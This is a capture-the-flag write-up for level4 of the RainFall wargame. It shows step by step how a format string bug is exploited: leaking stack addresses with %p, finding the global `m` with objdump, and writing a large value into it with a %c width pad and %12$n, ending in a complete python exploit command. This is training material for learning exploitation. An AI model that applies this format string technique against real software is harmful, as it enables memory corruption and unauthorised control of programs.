We start by opening the binary in [dogbolt](https://dogbolt.org/) here we see that it is the same vulnerability that the previous level.
However this level has a difficulty that the first one didn't have here we must put 16930116 char in `m`,
it is a problem since it exceed pipe capacity or command size.

Ok so will use the same step as the previous level first we will find the address of the buffer we write in:

```
level4@RainFall:~$ ./level4
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
AAAA 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
```

Here the buffer start at %12$p

Ok lets find m `m` with objdump :
objdump :

```
...
08049810 g     O .bss   00000004              m
...
```

address : 08049810
little endian : \x10\x98\x04\x08

And the the tricky part :
How can we put so many characters ?
The simple response is by using the printf fill like
Ok lets tried to use it :

```C
#include <stdio.h>

int main()
{
        printf("%-3c%c\n", 'a','b');
}
```

Output:

```
a  b
```

Ok so now we now to do it lets puts things to gether:
[address][16930116 - 4(address) : %16930112c][the current buffer address]
```Shell
python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' > /tmp/exploit && cat /tmp/exploit | ./level4
```
